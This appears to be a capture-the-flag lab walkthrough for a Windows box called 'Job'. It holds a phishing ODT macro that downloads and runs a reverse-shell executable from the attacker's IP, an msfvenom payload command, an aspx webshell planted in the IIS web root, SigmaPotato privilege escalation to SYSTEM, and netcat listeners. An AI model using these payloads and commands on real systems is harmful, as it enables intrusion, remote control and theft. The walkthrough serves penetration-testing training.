Job

Job

A great walkthough on a different box that uses ODT phishing: RE

└─$ sudo nmap -sS -sV -A 10.129.234.73 -p- -Pn

It looks like we can send CV applications to career@job.local:

Generate a Metasploit payload:

┌──(kali㉿kali)-[~/Desktop/Labs/Job]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.82 LPORT=443 -f exe --arch x64 --platform win > msf.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
┌──(kali㉿kali)-[~/Desktop/Labs/Job]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.82 LPORT=443 -f exe --arch x64 --platform win > msf.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes

Create an ODT file and insert the following macro:

Sub Main
    Shell("cmd /c powershell iwr 'http://10.10.15.82/win/rshell.exe' -o 'C:/windows/tasks/rshell.exe'")
    Shell("cmd /c 'C:/windows/tasks/rshell.exe'")
End Sub
Sub Main
    Shell("cmd /c powershell iwr 'http://10.10.15.82/win/rshell.exe' -o 'C:/windows/tasks/rshell.exe'")
    Shell("cmd /c 'C:/windows/tasks/rshell.exe'")
End Sub

Start listener and send the file:

┌──(kali㉿kali)-[~/Desktop/Labs/Job]
└─$ sudo swaks --to career@job.local --from john@local --body "CV" --attach @file.odt --header "Subject: CV" --server 10.129.234.73
=== Trying 10.129.234.73:25...
=== Connected to 10.129.234.73.
<-  220 JOB ESMTP
 -> EHLO kali
<-  250-JOB
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<john@local>
<-  250 OK
 -> RCPT TO:<career@job.local>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Fri, 06 Feb 2026 07:20:54 -0500
 -> To: career@job.local
 -> From: john@local
 -> Subject: CV
 -> Message-Id: <20260206072054.043957@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_43957"
 -> 
 -> ------=_MIME_BOUNDARY_000_43957
 -> Content-Type: text/plain
 -> 
 -> CV
 -> ------=_MIME_BOUNDARY_000_43957
 -> Content-Type: application/octet-stream; name="file.odt"

 -> Content-Disposition: attachment; filename="file.odt"
 -> Content-Transfer-Encoding: BASE64
 ->

The user is a part of a group called developers:

C:\Users\jack.black>whoami /groups

Members of developers have F (full) privileges over the C:\inetpub\wwwroot directory:

C:\inetpub\wwwroot>icacls C:\inetpub\wwwroot
icacls C:\inetpub\wwwroot
C:\inetpub\wwwroot JOB\developers:(OI)(CI)(F)
                   BUILTIN\IIS_IUSRS:(OI)(CI)(RX)

Download an aspx webshell over at C:\inetpub\wwwroot which can be accessed online via a web browser:

C:\inetpub\wwwroot>powershell /c iwr -uri http://10.10.15.82/cmdasp.aspx -outfile cmdasp.aspx
powershell /c iwr -uri http://10.10.15.82/cmdasp.aspx -outfile cmdasp.aspx

Access the webshell and use it to gain a reverse shell connection as iis apppool\defaultapppool:

By default IIS users have SeImpersonatePrivilege set.

Since the target is running Windows Server 2022 and the SeImpersonatePrivilege is set, the SigmaPotato can be used to escalate privileges. The tool is able to successfully find a token and run commands as NT AUTHORITY\SYSTEM:

PS C:\Temp> .\SigmaPotato.exe whoami
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 880 | Token: 0x736 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1000
[+] Current Command Length: 6 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 4340

[+] Process Output:
nt authority\system
PS C:\Temp> .\SigmaPotato.exe whoami
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 880 | Token: 0x736 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1000
[+] Current Command Length: 6 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 4340

[+] Process Output:
nt authority\system

Start another listener on port 444 and then use SigmaPotato to launch a reverse shell connection:

PS C:\Temp> .\SigmaPotato.exe --revshell 10.10.15.82 444


.......SNIP....


┌──(kali㉿kali)-[~/Desktop/Labs/Job]
└─$ nc -lvnp 444                          
listening on [any] 444 ...
connect to [10.10.15.82] from (UNKNOWN) [10.129.234.73] 60311
